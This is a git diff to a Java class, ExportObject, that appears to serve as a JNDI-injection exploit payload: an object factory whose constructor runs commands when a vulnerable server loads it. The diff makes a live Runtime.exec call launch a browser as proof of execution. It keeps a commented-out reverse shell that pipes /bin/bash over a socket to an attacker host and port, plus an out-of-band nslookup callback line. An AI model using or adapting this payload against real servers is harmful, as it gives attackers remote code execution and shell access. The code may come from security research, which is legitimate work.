@@ -2,8 +2,10 @@ package artsploit;
 
 import javax.naming.Context;
 import javax.naming.Name;
+import java.io.FileWriter;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.Hashtable;
 
@@ -16,15 +18,14 @@ import java.util.Hashtable;
 public class ExportObject implements javax.naming.spi.ObjectFactory {
     public ExportObject() {
         try {
-            //oob check
 //            Runtime.getRuntime().exec("nslookup jndi.x.artsploit.com");
-//            Runtime.getRuntime().exec("calc.exe");
+            Runtime.getRuntime().exec("chromium-browser");
 
             //Pure Groovy/Java Reverse Shell
             //snatched from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
-//            String lhost = "127.0.0.1";
-//            int lport = 8080;
-////            String cmd = "cmd.exe"; //win
+//            String lhost = " 0.0.0.0";
+//            int lport = 5001;
+//////            String cmd = "cmd.exe"; //win
 //            String cmd="/bin/bash"; //linux
 //            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
 //            Socket s = new Socket(lhost,lport);
@@ -49,7 +50,7 @@ public class ExportObject implements javax.naming.spi.ObjectFactory {
 //            }
 //            p.destroy();
 //            s.close();
-
+//
         } catch(Exception e) {
             e.printStackTrace();
         }
